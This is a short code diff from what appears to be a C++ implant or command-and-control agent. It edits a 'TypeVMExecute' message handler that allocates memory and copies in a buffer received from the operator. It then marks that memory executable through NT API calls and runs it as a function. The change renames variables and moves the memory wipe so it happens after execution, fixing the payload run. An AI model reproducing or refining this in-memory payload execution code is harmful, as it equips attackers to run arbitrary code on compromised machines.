@@ -273,24 +273,24 @@ namespace Message {
 
             case TypeVMExecute: {
 
-                LPVOID exec = { };
-                SIZE_T size = Parser.Length;
+                LPVOID Exec = { };
+                SIZE_T Size = Parser.Length;
 
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &Exec, 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                     return_defer(ntstatus);
                 }
 
-                x_memcpy(exec, Parser.Buffer, Parser.Length);
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
+                x_memcpy(Exec, Parser.Buffer, Parser.Length);
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &Exec, &Size, PAGE_EXECUTE_READ, nullptr))) {
                     return_defer(ntstatus);
                 }
 
-                void (*Cmd)(PPARSER) = (void (*)(PPARSER)exec);
-
-                x_memset(exec, 0, size);
+                auto (*Cmd)(PPARSER) = (void (*)(PPARSER))Exec;
                 Cmd(&Parser);
 
-                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
+                x_memset(Exec, 0, Size);
+
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &Exec, &Size, MEM_FREE))) {
                     return_defer(ntstatus);
                 }
             }
